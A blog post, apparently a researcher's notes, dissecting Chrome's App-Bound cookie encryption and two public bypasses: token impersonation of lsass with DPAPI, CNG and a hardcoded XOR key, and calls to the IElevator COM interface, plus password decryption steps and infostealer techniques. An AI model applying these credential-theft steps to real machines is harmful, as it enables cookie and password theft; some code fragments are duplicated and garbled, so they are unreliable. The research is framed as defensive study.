---
layout: post
title: "Chrome credentials - 2025"
nav_order: 2
has_children: true

---

# Chrome credentials - 2025 

*July 2025*

In September 2024, I was handed a project that had been collecting dust for a while. It was a kind of browser credential honeypot that needed a script to automatically inject passwords or cookies into the browser. A bit of a crazy idea — but fun nonetheless.
<br>

I'd already played around with some stealers before, so I knew the basics of the DPAPI setup: credentials live in SQLite databases, BCrypt32 CryptUnprotectData call, the Master key stored on disk, readable with user-level permissions.<br>

I didn’t know Google had just rolled out **Application Bound Encryption cookies protection in July 2024**. The master key is now also DPAPI-protected under the System and User context, and can’t be unwrapped directly by the user. 

By October/November, the first bypass PoCs appeared: <br>

- One used admin rights to mimic Chrome's logic: decrypt under System, then under user, then finish with AES using a hardcoded key. Turns out “Application Bound” is just DPAPI wrapped in DPAPI + some Chrome internal cooking made with AES and Xor. 

- The second used Chrome’s COM interface — IElevator — to get Chrome to decrypt cookies.

I needed to document this Chrome study somewhere, mostly as a personal reminder — hence, this blog post.


## Cookies : the new Chrome App Bound Encryption 
<br>
Time to break down the App Bound Encryption (ABE).
<br>
App Bound Encryption (ABE) is a security feature introduced by Chromium in July 2024 to prevent external programs or other Chromium-based apps from decrypting sensitive user data, even if they are running under the same OS user context.

It ties cookie decryption to the Chrome application binary, preventing other processes from accessing stored secrets. The profile encryption key is still initially protected by DPAPI, but ABE adds a second layer. That second layer uses a Windows platform key stored in a secure system service, which only SYSTEM can access.


![alt text](/assets/Chome-App-Bound/screenshots/app-bound-encryption.png?raw=true)

[Google Blog](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)

Google also add an internal layer of encryption based on CNG API and Xor with a fixed value.  Here it is how it happens in Chrome 

The Application bound provider (browser/os_crypt/app_bound_encryption_provider_win.cc) calls the elevation service through the DecryptAppBoundString function 

```
HRESULT res = os_crypt::DecryptAppBoundString(
  encrypted_key_string, decrypted_key_string, kCurrentProtectionLevel,
  maybe_new_ciphertext, last_error, &flags);
```

```
HRESULT DecryptAppBoundString(const std::string& ciphertext,
  std::string& plaintext,
  ProtectionLevel protection_level,
  std::optional<std::string>& new_ciphertext,
  DWORD& last_error,
  elevation_service::EncryptFlags* flags) 
```

This function uses the elevation_service 2 methods CoCreateInstance, CoSetproxyBlanket and to instanciate the COM object IElevator identified by its CLSID and IId. Then the DecryptData to get the decrypted Application Bound MasterKey.

```
 HRESULT hr = ::CoCreateInstance(
  install_static::GetElevatorClsid(), nullptr, CLSCTX_LOCAL_SERVER,
  install_static::GetElevatorIid(), IID_PPV_ARGS_Helper(&elevator));
```
```
hr = ::CoSetProxyBlanket(
  elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
  COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
  RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);
```
```
hr = elevator->DecryptData(ciphertext_data.Get(), plaintext_data.Receive(),&last_error);
```

Elevation service (chrome/elevation_service/elevator.cc) function DecryptData implements few steps 

Elevated call to function CryptUnProtectData, using the function with SYSTEM privileges
```
// Decrypt using the SYSTEM dpapi store.
if (!::CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0,&intermediate)) {... }
```

Then impersonates current user to decrypt the key a second time with DPAPI user bounded.  

```
// Decrypt using the user store.
if (ScopedClientImpersonation impersonate; impersonate.is_valid()) {
  ...
  if (!::CryptUnprotectData(&intermediate, nullptr, nullptr, nullptr, nullptr,0, &output)) { ...}
  ...
}
```

Check calling process is Google Chrome 

```
const auto process = GetCallingProcess();
if (!process.IsValid()) {
  *last_error = ::GetLastError();
  return kErrorCouldNotObtainCallingProcess;
}
```

Finally process some PostProcessData function that is not referenced in the Chromium Code Search.

```
auto post_process_result = PostProcessData(plaintext_str, &flags);
``` 

Runassu finded out that the PostProcessData uses NCryptDecrypt function from ncrypt.dll and fixed key name "Google Chromekey1" stored in Microsoft Software Key Storage Provider to perform the CNG decryption.  The NCryptDecrypt also need System impersonation. 

```
SECURITY_STATUS NCryptDecrypt(
  [in]           NCRYPT_KEY_HANDLE hKey,
  [in]           PBYTE             pbInput,
  [in]           DWORD             cbInput,
  [in, optional] VOID              *pPaddingInfo,
  [out]          PBYTE             pbOutput,
  [in]           DWORD             cbOutput,
  [out]          DWORD             *pcbResult,
  [in]           DWORD             dwFlags
);
```


Finally the key is xored with another fixed key, hex value "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390" 


---

## **Decryption** 


The first bypass PoCs managed to exploit the elevator service in two different ways. 

- the runassu solution [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption) reversed the full decryption algorithm. It performs the double DPAPI decryption with System and user privileges, parse the key, apply the CNG decryption then the Xor and finally performs the AES decryption of app bound encrypted key. 

- the xaitax solution directly [https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) implements the COM IElevator interface and take benefit of the DecryptData function that returns directly the cookies AES key. But it is limited by the GetCallingProcess() function check we have seen. It must be executed from Chrome legit application path C:\Program Files\Google\Chrome\Application. So a privilege elevation is also needed, as Admin to drop the file into the Application directory. 
xaitax also set up a dll injection that makes the code directly executable into Chrome's process. 

---

### ByPass using full decryption (runassu method)
<br>

This technique is based on the work of runassu [chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption). The proof of concept runs with Admin privileges. It explores the full process of cookies encryption used by chrome. The original code is written in python. Let's decompose it once again in Windows API calls.


#### What’s the idea?

- use DPAPI as SYSTEM on app_bound_encryption_key form Local State json 
- use DPAPI as targeted User on new key 
- parse the key 
- use CNG API to decrypt the AES key parsed
- xor with a hardcoded chrome key 
- finally decode the app bound encrytion key with the AES MasterKey obtained


#### **Extract Local State Key**

The application bound encrypted key is stored in the json too. `C:\Users\<User>\AppData\Local\Google\Chrome\User Data\Local State` with key name "app_bound_encrypted_key"


#### **DPAPI Decryption as SYSTEM** 

This is the same process as password decryption. We call the CryptUnprotectData on app_bound_encrypted_key. In the same way as Chrome we proceed some System and user privileges impersonation. System privileges can be gained by duplicating the lsass.exe process token for example, or any ther process running with system privileges. In the same way any user process token can be used to impersonate the user. 

Token can be duplicate using processthreadsapi.h and securitybaseapi.h libraries. 

```
BOOL OpenProcessToken(
  [in]  HANDLE  ProcessHandle,
  [in]  DWORD   DesiredAccess,
  [out] PHANDLE TokenHandle
);
```

```
BOOL DuplicateTokenEx(
  [in]           HANDLE                       hExistingToken,
  [in]           DWORD                        dwDesiredAccess, // TOKEN_ALL_ACCESS = STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES;
  [in, optional] LPSECURITY_ATTRIBUTES        lpTokenAttributes,
  [in]           SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, // 2
  [in]           TOKEN_TYPE                   TokenType,// TOKEN_IMPERSONATE = 0x0004
  [out]          PHANDLE                      phNewToken
);
```

```
ImpersonateLoggedOnUser(lsassToken)
  // CryptUnProtectData  run as SYSTEM
RevertToSelf();
ImpersonateLoggedOnUser(someUserProcessToken)
  // CryptUnProtectData  run as User
RevertToSelf();
```

At the end of this stuff we get the Application bound key decrypted. It contains an AES encrypted key. Here starts the Chrome internal stuff with CNG and xor decryptions. 

#### **Structure of the Application bound Key**

```
+------------+------------+--------------+--------+------------------+--------+----------+-----+
| HeaderLen  |  Header    | ContentLen   | Flag   | EncryptedAESKey  |  IV    | Cipher   | Tag |
+------------+------------+--------------+--------+------------------+--------+----------+-----+
|  4 bytes   | N bytes     |   4 bytes     | 1 byte |    32 bytes      | 12 B   | M bytes  | 16B |
```


#### **AES Key derivation**

This part is a bit mysterious yet to me, as I didn't find where it is implemented. I just follow the runassu poc. 
The EncryptedAESKey 32 bytes is decrypted with NCryptDecrypt using SYSTEM privileges and key "Google Chromekey1" from Microsoft Software Key Storage Provider 
 


```
SECURITY_STATUS NCryptDecrypt(
  [in]           NCRYPT_KEY_HANDLE hKey,
  [in]           PBYTE             pbInput,
  [in]           DWORD             cbInput,
  [in, optional] VOID              *pPaddingInfo,
  [out]          PBYTE             pbOutput,
  [in]           DWORD             cbOutput,
  [out]          DWORD             *pcbResult,
  [in]           DWORD             dwFlags
);
```

It returns another bytes array, data structure, we need to extract 32 bytes once again from offset 2. This key is xored with hexa key "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390" 

Fianlly the last AES decryption using the xor decryption output as masterKey, the IV initialization vector and Tag stored in the decrypted Application Bound key. 


---

### Bypass using COM IElevator (xaitax method)
<br>

This proof of concept explores the use of browser-specific COM interface IElevator to invoke undocumented methods like DecryptData() via direct vtable dispatching.

COM (Component Object Model) is a Windows technology that allows software components to communicate across processes and languages.
COM objects expose interfaces with methods that other applications can invoke.
They support inter-process communication and code reuse.
Used by Windows internally (e.g., Shell, Office, Windows Defender).
Can be accessed via languages like C++, PowerShell, and VBScript.

In the case of App-Bound Encryption, Chrome uses an internal, brokered COM service to access the App-Bound Key and decrypt cookies.
[IElevator source code](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/elevation_service/elevator.cc)

So it is possible to call Chrome Elevator instance to access the `DecryptData` function and let Chrome do App bounded the stuff. This chapter is based on the research of xaitax in this [github repository](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)


#### **IElevator interface definition** 

The class IElevator acts as a COM client wrapper, exposing helper functions to locate and invoke three undocumented methods — RunRecoveryCRXElevated, EncryptData, and DecryptData. These are exposed through a manually declared vtable mapping, starting from index 3, since the first three vtable slots in a COM object typically represents standard IUnknown methods (QueryInterface, AddRef, Release).


```
IDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
  IElevator : public IUnknown {
  public:
      virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
          const WCHAR *crx_path, const WCHAR *browser_appid, const WCHAR *browser_version,
          const WCHAR *session_id, DWORD caller_proc_id, ULONG_PTR *proc_handle) = 0;

          const WCHAR* crx_path, const WCHAR* browser_appid, const WCHAR* browser_version,
          const WCHAR* session_id, DWORD caller_proc_id, ULONG_PTR* proc_handle) = 0;
      virtual HRESULT STDMETHODCALLTYPE EncryptData(
          ProtectionLevel protection_level, const BSTR plaintext,
          BSTR *ciphertext, DWORD *last_error) = 0;

          BSTR* ciphertext, DWORD* last_error) = 0;
      virtual HRESULT STDMETHODCALLTYPE DecryptData(
          const BSTR ciphertext, BSTR *plaintext, DWORD *last_error) = 0;
          const BSTR ciphertext, BSTR* plaintext, DWORD* last_error) = 0;
  };
}
```


#### **Calling IElevator**

The code first identifies the right CLSID and IID for the browser being targeted (Chrome, Edge, Brave), and attempts to instantiate the IElevator COM object using CoCreateInstance with CLSCTX_LOCAL_SERVER. It then sets a custom COM security blanket to enable impersonation through CoSetProxyBlanket, which is necessary for some RPC operations.

Once a valid COM pointer is obtained, the script extracts the encrypted master key from the browser’s Local State file (stored under os_crypt.app_bound_encrypted_key), skips the DPAPI prefix, and attempts to pass the raw encrypted blob to DecryptData. This decrypted output would, if everything goes well, represent the plaintext AES-GCM key used to encrypt browser cookies.


#### **Datas** 

Structure : name, processName, clsid, iid, userDataSubpath 

```
if (browserType == "chrome")
{
    return {
        // https://github.com/chromium/chromium/blob/225f82f8025e4f93981310fd33daa71dc972bfa9/chrome/elevation_service/elevation_service_idl.idl
        {0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B}},
        {0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8}},
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "\\Google\\Chrome\\User Data\\Local State",
        "Chrome"};
}
else if (browserType == "brave")
{
    return {
        // https://github.com/brave/brave-core/blob/1bc3b9e011c17e16a7aba895cac7e845b87ba5dc/chromium_src/chrome/elevation_service/elevation_service_idl.idl
        {0x576B31AF, 0x6369, 0x4B6B, {0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B}},
        {0xF396861E, 0x0C8E, 0x4C71, {0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9}},
        "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
        "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
        "Brave"};
}
else if (browserType == "edge")
{
    return {
        // Thank you James Forshaw (@tyraniddo) - https://github.com/tyranid/oleviewdotnet
        {0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67}},
        {0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B}},
        "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "\\Microsoft\\Edge\\User Data\\Local State",
        "Edge"};
}
```



#### **COM object init**


```
HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

Microsoft::WRL::ComPtr<IEdgeElevatorFinal> elevator;
hr = CoCreateInstance(config.clsid, nullptr, CLSCTX_LOCAL_SERVER, config.iid, (void **)&elevator);
```

```
CoSetProxyBlanket(elevator.Get(), RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_DYNAMIC_CLOAKING);

```
#### **Decrypt via COM**

```
BSTR bstrPlainKey = nullptr;
hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
```

---

## Cookies structure 

A word about the cookies structure.  All the previous POC purpose were to get the AES Master key to decrypt the cookie encrypted_value 

Here is a C++ like full cookie structure 

```
#define MAX_STR 512
#define MAX_BIN 4096

struct ChromeCookie {
    int64_t creation_utc;
    char host_key[MAX_STR];
    char name[MAX_STR];
    char value[MAX_STR];
    char path[MAX_STR];
    int64_t expires_utc;
    char top_frame_site_key[MAX_STR];
    unsigned char encrypted_value[MAX_BIN];
    int encrypted_value_len;
    int is_secure;
    int is_httponly;
    int has_expires;
    int64_t last_access_utc;
    int is_persistent;
    int priority;
    char same_site[MAX_STR];
    int source_scheme;
    int source_port;
    char same_type[MAX_STR];
    int64_t creation_utc_dup;
    int has_cross_site_ancestor;
};

```

It's worth mentioning the host_key format is ".[domain]" like ".google.com" while the encrypted_value is composed by a sha256 hash of the host_key + cookie value. 

So what we get once decrypted is sha256(host_key) + cookie_decrypted_value

---

## Chrome stored data reminder 
<br>
Chromium-based browsers like Google Chrome, Microsoft Edge, Brave store a variety of sensitive user data, including:

- **Saved passwords**
- **Cookies and session tokens**
- **Form autofill data**
- **Credit card information**
- **Browser history**
- **Installed extensions and their local storage**

This data is stored on disk in various formats and directories under the user's profile.

*C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default* on Windows.

| Data Type                | File / Folder Location                                       | Format            | Notes                                                               |
| ------------------------ | ------------------------------------------------------------ | ----------------- | ------------------------------------------------------------------- |
| **Passwords**            | `Login Data`                                                 | SQLite            | Encrypted with AES-GCM using DPAPI-unlocked master key              |
| **Cookies**              | `Network/Cookies`                                            | SQLite            | Encrypted with AES-GCM, App Bound Master Key (Windows 10+ / v80+)   |
| **Form Autofill Data**   | `Web Data`                                                   | SQLite            | Includes names, addresses, emails, phone numbers                    |
| **Credit Card Info**     | `Web Data`                                                   | SQLite            | Encrypted; full credit card numbers stored only if user allows      |
| **Browser History**      | `History`                                                    | SQLite            | URLs visited, timestamps, visit counts, etc.                        |
| **Installed Extensions** | `Extensions\` folder                                         | Files/JSON        | Metadata stored in `manifest.json`, state in IndexedDB/LocalStorage |
| **Local Extension Data** | `Local Extension Settings\<ext_id>\` and `IndexedDB\`        | LevelDB/IndexedDB | Includes extension-specific storage and potentially sensitive data  |
| **Session/Tab State**    | `Sessions`, `Last Session`, `Last Tabs`                      | Binary/Protobuf   | Recently closed tabs and windows                                    |
| **Favicons**             | `Favicons`                                                   | SQLite            | Stores site icons and their mapping to URLs                         |
| **Bookmarks**            | `Bookmarks`                                                  | JSON              | Tree-structured list of user bookmarks                              |
| **Preferences**          | `Preferences`                                                | JSON              | Browser and user settings, includes extension permissions           |
| **Downloads**            | `History`                                                    | SQLite            | Stored along with visit history under the `downloads` table         |
| **Media Licenses**       | `Pepper Data\Shockwave Flash\WritableRoot` or `WidevineCdm\` | Files             | Used for DRM content; may store license keys                        |

---

## Manipulate Chromium Stored Data
<br>
It could be interesting to make an inventory of malware practices at mid-2025, how they deal with encryption changes. It's a landmark. 

### 1. Chrome DevTool Protocol

Use Chrome's **DevTools Protocol** (CDP) on `localhost:9222`.

- **Pros**: CDP Doesn't require file access or OS decryption, Chrome do the stuff. It is scriptable and allows real-time manipulation. 
- **Cons**: Opening port on localhost or CDP can be blocked by security. Most importantly, debuging session operates in an isolated environement `--user-data-dir`  pointing to a separate profile is required. The Chrome default launch parameters must be modified to create a default debuggable profile. 


### 2. Browser Extensions

Extensions can access cookies, local storage, and tab/session data using the [Chrome Extension APIs](https://developer.chrome.com/docs/extensions/reference/).

- **Pros**: Extensions are cross-platform, also operates in the Browser context. They Can persist and exfiltrate data. 
- **Cons**: Extensions are limited by manifest permissions. They cannot access saved passwords neither master key. Audited extensions may be flagged by browser security or attackers. 
  

### 3. OS-Level File Access + Decryption

Reading the SQLite files (`Login Data`, `Cookies`) and decrypting with OS crypto libraries (e.g., `CryptUnprotectData`, `Keychain`).

- **Pros**: This technique provides full access to stored credentials and cookies and can also works on disk snapshots in a forensic case.  
- **Cons**: The Google Security must be bypassed, which requires user context and/or SYSTEM privileges

### 4. Memory Dump & Analysis

We can also probably analyze live memory to extract decrypted credentials, cookies, or AES keys. It could be another way. I must confess I let this possibility out of scope. 

- **Pros**: May bypasses OS-level encryption
- **Cons**: Volatile data; higher technical barrier

---

## Passwords decryption 
<br>
Chrome uses two distinct encryption strategies: one for saved passwords, another for cookies. Both rely on DPAPI, but cookie path diverged from passwords and got more complex mid-2024 with the addition of Application Bound Encryption. This section breaks down the structure of simple DPAPI. 

### Passwords decryption : simple DPAPI method 

The Master Key: Chrome stores a randomly generated key in the Local State JSON file under os_crypt.encrypted_key. This master key is encrypted using DPAPI (user-bound).

- SQLite %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
- Get Chrome user level AES Master key  located in  %LOCALAPPDATA%\Microsoft\Edge\User Data\Local State
- Decrypt MasterKey with CryptUnprotectData
- Decrypt AES-GCM password with BCryptDecrypt and decrypted Masterkey

#### **DPAPI Decryption** 

Function CryptUnprotectData from dpapi.h decrypt the input DATA_BLOB *pDataIn and stores the result in *pDataOut

```
DPAPI_IMP BOOL CryptUnprotectData(
  [in]            DATA_BLOB                 *pDataIn,
  [out, optional] LPWSTR                    *ppszDataDescr,
  [in, optional]  DATA_BLOB                 *pOptionalEntropy,
                  PVOID                     pvReserved,
  [in, optional]  CRYPTPROTECT_PROMPTSTRUCT *pPromptStruct,
  [in]            DWORD                     dwFlags,
  [out]           DATA_BLOB                 *pDataOut
);

```

DATA_BLOB structure. cbData contains the Length of bytes data and *pbData is a pointer to content bytes data(encrypted/decrypted)
```
typedef struct _CRYPTOAPI_BLOB {
  DWORD cbData;  
  BYTE  *pbData; 
} 
```

#### **Structure of the Chrome AES master key** 

```
Header = [0..3] // Chrome specific version
IV = 96 random bit [3..15] 
CipherText : 16 bit [15..17]
TAG = 128 bit [-16]
```

#### **AES-GCM decryption** 

Finally the password encrypted_value can be decrypted using BCryptDecrypt from bcrypt.h with a symetric AES-GCM key 

```
NTSTATUS BCryptDecrypt(
  [in, out]           BCRYPT_KEY_HANDLE hKey,
  [in]                PUCHAR            pbInput,
  [in]                ULONG             cbInput,AES
  [out, optional]     PUCHAR            pbOutput,
  [in]                ULONG             cbOutput,
  [out]               ULONG             *pcbResult,
  [in]                ULONG             dwFlags
);
```

Bcrypt Algorithm and chaining mode variables

```
BCRYPT_AES_ALGORITHM = "AES"
BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM"
BCRYPT_CHAINING_MODE = "ChainingMode"
BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength"
```

---

## Conclusion

<br>

**DPAPI user-bound encryption** restricts the decryption on the host they were encrypted. But they can be decrypted by code running as the current user. No admin privileges are strictly needed here. An attacker with user-level access can extract and decrypt these secrets, assuming access to user profile files. 

**App-Bound Encryption (ABE) decryption**, however, requires elevated privileges. This is because it depends on:
- Impersonating the SYSTEM account and the target user token
- Calling platform APIs such as NCryptDecrypt 

**DLL injection**  into the Chrome process running as the current user is a powerful technique to bypass these boundaries, since injected code inherits Chrome’s token and CNG key context. Reflective DLL injection as xaitax set up does not necessarily require admin privileges, only that the attacker can run code in the user session, which is enough to perform elevator service call. 


The complexity and reliability of these attacks **also depend heavily on hardcoded or system-registered identifiers**, difficult to gather dynamically and can act as killswitch in any Chrome's update:
- CLSIDs and IIDs for COM interfaces
- The "Google Chromekey1" key name inside the Microsoft Software Key Storage Provider
- The fixed XOR key used for additional obfuscation


This change  in cookie encryption can also be a landmark for threat intelligence, to tracker infostealers mutation.

## References 

- **Chrome Extensions APIS :** [https://developer.chrome.com/docs/extensions/reference/](https://developer.chrome.com/docs/extensions/reference/)
- **Application Bound Encryption on Google Blog :** [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- **Enumerating COM Objects :** [https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-com-objects-and-their-methods](https://www.ired.team/offensive-security/enumeration-and-discovery/enumerating-com-objects-and-their-methods)
- **OLE COM Object Viewer :** [https://learn.microsoft.com/en-us/windows/win32/com/ole-com-object-viewer](https://learn.microsoft.com/en-us/windows/win32/com/ole-com-object-viewer)
- **IElevator source code :** [https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/elevation_service/elevator.cc](https://chromium.googlesource.com/chromium/src/+/refs/heads/main/chrome/elevation_service/elevator.cc)
- **Chrome cookies source code :** [https://source.chromium.org/chromium/chromium/src/+/main:net/cookies/canonical_cookie.cc](https://source.chromium.org/chromium/chromium/src/+/main:net/cookies/canonical_cookie.cc)
- **Chrome-App-Bound-Encryption-Decryption via COM IElevator GitHub :** [https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- **Chrome-App-Bound-Encryption-Decryption via algorithm :** [https://github.com/runassu/chrome_v20_decryption](https://github.com/runassu/chrome_v20_decryption)


T.C
